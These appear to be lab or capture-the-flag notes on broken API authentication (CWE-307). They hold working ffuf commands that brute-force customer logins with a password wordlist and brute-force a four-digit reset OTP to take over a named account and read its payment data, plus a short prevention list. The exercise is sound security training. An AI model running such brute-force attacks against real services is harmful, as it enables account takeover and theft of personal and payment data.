**CWE-307: Improper Restriction of Excessive Authentication Attempts

- Currently logged-in customer is assigned three roles: Customers_UpdateByCurrentUser, Customers_Get, and Customers_GetAll
- There is a PATCH where we can set a user password. It shows that passwords must be 6 characters long, no complexity.
- We can bruteforce weak passwords!

```
ffuf -w /opt/useful/seclists/Passwords/xato-net-10-million-passwords-10000.txt:PASS -w customerEmails.txt:EMAIL -u http://94.237.59.63:31874/api/v1/authentication/customers/sign-in -X POST -H "Content-Type: application/json" -d '{"Email": "EMAIL", "Password": "PASS"}' -fr "Invalid Credentials" -t 100
```


**Prevention
1. Minimum password length
2. Complexity
3. Prohibit common passwords
4. Enforce password history and prevent reuse
5. Enforce password expiration

Exploit another Broken Authentication vulnerability to gain unauthorized access to the customer with the email 'MasonJenkins@ymail.com'. Retrieve their payment options data and submit the flag.
```
seq -w 0 9999 >> otp.txt
ffuf -w ./otp.txt -u http://83.136.255.170:50254/api/v1/authentication/customers/passwords/resets -X POST -H "Content-Type: application/json" -d '{"Email": "MasonJenkins@ymail.com", "OTP": "FUZZ", "NewPassword": "P@ssword1"}' -fs 23
```
- Create OTP with /api/v1/authentication/customers/passwords/resets/email-otps
- Brute force OTP with above and reset password
- Login with Mason user to get JWT and then find flag under /api/v1/customers/payment-options/current-user
